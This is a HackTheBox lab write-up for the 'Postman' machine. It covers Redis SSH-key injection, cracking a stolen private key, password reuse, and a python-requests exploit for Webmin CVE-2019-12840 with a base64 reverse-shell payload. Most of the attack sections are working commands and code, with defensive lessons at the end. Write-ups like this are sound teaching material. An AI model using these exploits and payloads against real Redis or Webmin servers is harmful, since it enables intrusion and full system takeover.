---
title: "Postman — HackTheBox Walkthrough"
description: "Unauthenticated Redis leading to SSH key injection, a cracked private key, and Webmin CVE-2019-12840 for root."
date: 2026-09-08
category: offensive
readTime: "11 min read"
mitre:
  - "T1046"
  - "T1190"
  - "T1098.004"
  - "T1552.001"
  - "T1552.004"
  - "T1110.002"
  - "T1078"
  - "T1059.004"
  - "T1068"
tags:
  - "HackTheBox"
  - "HTB"
  - "CPTS"
  - "Linux"
  - "Redis"
  - "Webmin"
  - "CVE-2019-12840"
  - "SSH"
  - "Privilege Escalation"
summary: "Unauthenticated Redis leading to SSH key injection, a cracked private key, and Webmin CVE-2019-12840 for root."
---

**Machine:** Postman
**OS:** Linux (Ubuntu 18.04)
**Difficulty:** Easy
**Key Techniques:** Unauthenticated Redis, arbitrary file write via `CONFIG SET`/`SAVE`, SSH key injection, `ssh2john` + John, credential reuse, Webmin 1.910 RCE (CVE-2019-12840)

---

## Reconnaissance

### Port Scan

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.129.2.1
nmap -p 22,80,6379,10000 -sC -sV -oA scans/nmap-tcpscripts 10.129.2.1
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80 | HTTP | Apache httpd 2.4.29 — "The Cyber Geek's Personal Website" |
| 6379 | Redis | Redis key-value store 4.0.9 |
| 10000 | HTTP | MiniServ 1.910 (Webmin httpd) |

Two findings jump out immediately: **Redis is exposed** (rarely a good sign) and **Webmin 1.910** is a version with a well-known authenticated RCE.

### Web Enumeration

Port 80 hosts a static "under construction" page with no interesting links:

```bash
gobuster dir -u http://10.129.2.1 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x php
# /images  /upload  /css  /js  /fonts  (all 301, nothing useful)
```

Port 10000 plain HTTP returns an error directing to HTTPS; `https://10.129.2.1:10000/` presents the Webmin login.

### Redis Enumeration

The Redis service accepts connections **without authentication**:

```bash
redis-cli -h 10.129.2.1
10.129.2.1:6379> info
# requirepass is empty, protected-mode no
10.129.2.1:6379> keys *
# (empty)
```

---

## Foothold — Unauthenticated Redis to SSH Access

With no password and `protected-mode no`, we can use Redis as an arbitrary file-write primitive by pointing its working directory and dump filename at a target path and calling `SAVE`.

The ideal target is the `redis` service account's `authorized_keys` file. Redis serializes the RDB binary around our key, but `sshd` parses the file line-by-line and ignores the surrounding junk.

### Generate and inject a keypair

```bash
ssh-keygen -t rsa -f ~/id_rsa_generated -N ""

# Pad the public key with blank lines so it survives RDB serialization cleanly
(echo -e "\n\n"; cat ~/id_rsa_generated.pub; echo -e "\n\n") > spaced_key.txt

cat spaced_key.txt | redis-cli -h 10.129.2.1 -x set 0xdf
```

### Redirect the RDB dump

```bash
redis-cli -h 10.129.2.1
10.129.2.1:6379> config set dir /var/lib/redis/.ssh
10.129.2.1:6379> config set dbfilename "authorized_keys"
10.129.2.1:6379> save
```

### Authenticate

```bash
ssh -i ~/id_rsa_generated redis@10.129.2.1
redis@Postman:~$ id
# uid=107(redis) gid=114(redis) groups=114(redis)
```

> **Note:** writing a PHP webshell to `/var/www/html` does not work (Apache runs as `www-data` and the path is not writable by `redis`). Likewise, `MODULE` is renamed out in `redis.conf`, so the Metasploit `linux/redis/redis_unauth_exec` master/slave module fails.

---

## Lateral Movement — `redis` → `Matt`

Basic enumeration as `redis` reveals a world-readable private key backup:

```bash
redis@Postman:/$ ls -la /opt/id_rsa.bak
-rwxr-xr-x 1 Matt Matt 1743 /opt/id_rsa.bak
```

The key is passphrase-protected (`Proc-Type: 4,ENCRYPTED`). Crack it offline:

```bash
python /opt/john/run/ssh2john.py id_rsa.bak > id_rsa_bak.john
john id_rsa_bak.john --wordlist=/usr/share/wordlists/rockyou.txt
# computer2008
```

Direct SSH as `Matt` is blocked by `DenyUsers Matt` in `sshd_config`, so pivot locally — and reuse the passphrase as the account password:

```bash
redis@Postman:/$ su Matt
Password: computer2008
Matt@Postman:/$ id
# uid=1000(Matt)
Matt@Postman:~$ cat user.txt
```

---

## Privilege Escalation — Webmin CVE-2019-12840

Matt's password also authenticates to Webmin at `https://10.129.2.1:10000`. Version 1.910 exposes **CVE-2019-12840**: any user with access to the *Software Package Updates* module can inject commands via the unsanitized `u=` parameter in `package-updates/update.cgi`.

### Manual PoC (python-requests)

Webmin validates the `Referer`, and the parameter must be supplied twice — so pass `data` as a list of tuples:

```python
import requests, requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

s = requests.session()
s.post('https://10.129.2.1:10000/session_login.cgi',
       data={'page': '', 'user': 'Matt', 'pass': 'computer2008'}, verify=False)

# Sanity check
r = s.post('https://10.129.2.1:10000/package-updates/update.cgi',
           data=[('u', 'acl/apt'), ('u', ' | bash -c id'),
                 ('ok_top', 'Update Selected Packages')],
           verify=False, headers={'Referer': 'https://10.129.2.1:10000/'})
print(r.text)   # uid=0(root)
```

### Reverse shell

```bash
# attacker listener
nc -lnvp 443
```

```python
r = s.post('https://10.129.2.1:10000/package-updates/update.cgi',
           data=[('u', 'acl/apt'),
                 ('u', ' | bash -c "echo <BASE64>|base64 -d|bash -i"'),
                 ('ok_top', 'Update Selected Packages')],
           verify=False, headers={'Referer': 'https://10.129.2.1:10000/'})
```

```bash
root@Postman:~# id
uid=0(root) gid=0(root)
root@Postman:~# cat /root/root.txt
```

### Metasploit alternative

```bash
use exploit/linux/http/webmin_packageup_rce
set RHOSTS 10.129.2.1
set RPORT 10000
set SSL true
set USERNAME Matt
set PASSWORD computer2008
set LHOST <tun0>
run
```

> CVE-2019-15107 (the Webmin 1.920 unauthenticated backdoor) is a **dead end** here — this is 1.910 and password changing is disabled.

---

## Flags

```bash
cat /home/Matt/user.txt
cat /root/root.txt
```

Flag values are unique to each HTB instance and are intentionally omitted.

---

## Lessons Learned

1. **Never expose Redis to the internet unauthenticated.** With write access, `CONFIG SET dir` + `dbfilename` + `SAVE` is an arbitrary file write, which becomes code execution via `authorized_keys`, cron, or web roots.
2. **A private key on disk is a credential.** `/opt/id_rsa.bak` plus a weak passphrase handed over the account.
3. **Password reuse amplifies any crack.** The same secret (`computer2008`) was the key passphrase, the system password, and the Webmin password.
4. **Don't stop at the first "no".** `DenyUsers Matt` was a deliberate obstacle; lateral movement via `su` kept the chain alive.
5. **Patch management interfaces.** Webmin 1.910's `Package Updates` module is an authenticated root RCE — an admin panel running as root is a direct path to full compromise.
